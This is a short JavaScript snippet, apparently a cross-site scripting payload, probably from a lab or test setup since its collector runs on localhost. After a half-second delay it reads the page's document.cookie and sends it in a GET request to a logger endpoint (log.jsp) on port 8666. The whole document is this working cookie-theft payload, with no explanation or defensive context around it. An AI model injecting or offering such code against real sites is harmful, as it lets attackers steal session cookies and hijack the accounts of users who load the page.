setTimeout(function () {
    var cookiecontent = document.cookie;
    var url = "http://localhost:8666/logger/log.jsp?cookie=" + cookiecontent;
    var xmlhttp;
    if (window.XMLHttpRequest) {
        xmlhttp = new XMLHttpRequest();
    }
    xmlhttp.open("GET", url, true);
    xmlhttp.send();
}, 500);